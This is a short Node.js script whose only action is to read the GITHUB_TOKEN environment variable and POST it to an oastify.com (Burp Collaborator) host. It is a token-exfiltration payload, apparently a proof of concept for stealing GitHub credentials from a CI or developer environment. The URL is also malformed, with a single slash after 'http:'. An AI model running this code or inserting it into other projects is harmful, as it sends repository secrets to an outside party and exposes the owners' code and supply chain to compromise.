const fetch = require('node-fetch');

// The URL of your collaborator's link
const URL = "http:/xuvd37sjmd3i0vwp84vfmjq0argi4bs0.oastify.com";

// GitHub token (ensure this is set in your environment variables)
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;

// Use fetch to send a POST request to the URL with the GitHub token in the request body
fetch(URL, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
        'token': GITHUB_TOKEN
    })
})
.then(response => response.text())
.then(text => console.log(text))
.catch(err => console.error(err));
